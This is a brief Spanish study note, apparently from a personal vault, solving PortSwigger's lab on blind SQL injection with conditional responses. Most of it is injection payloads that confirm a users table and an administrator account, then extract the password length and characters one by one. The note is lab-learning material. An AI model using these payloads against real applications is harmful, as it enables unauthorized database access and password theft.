---
tags:
  - CTF
  - estado/completo
plataforma: "[[05 - Mocs/PortSwigger|PortSwigger]]"
web: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
dificultad: Fácil
autor: 
relacionados:
  - "[[04 - Códigos/PortSwigger - SQLI 11|PortSwigger - SQLI 11]]"
---
# Blind SQL injection with conditional responses

## Resolución

Consulta manipulada:

1. **Conocer la tabla de `users`:**  
```sql
    ' and (select 'a' from users LIMIT 1)='a'--
````
    
2. **Conocer si el usuario administrador existe en la tabla de `users`:**  
```sql
    ' and (select username from users where username='administrator') = 'administrator' -- -
```
    
3. **Conocer la contraseña del usuario administrador:**
- **Conocer la longitud:**  
```sql
	' and (select username from users where username='administrator' and LENGTH(password)>1) = 'administrator' -- -
```
- **Conocer la contraseña:**
```sql
	' and (select substring(password,1,1) from users where username='administrator')='a'-- -
```

4. **Como funciona muy lento, podría usar el programa [[04 - Códigos/PortSwigger - SQLI 11|PortSwigger - SQLI 11]]**
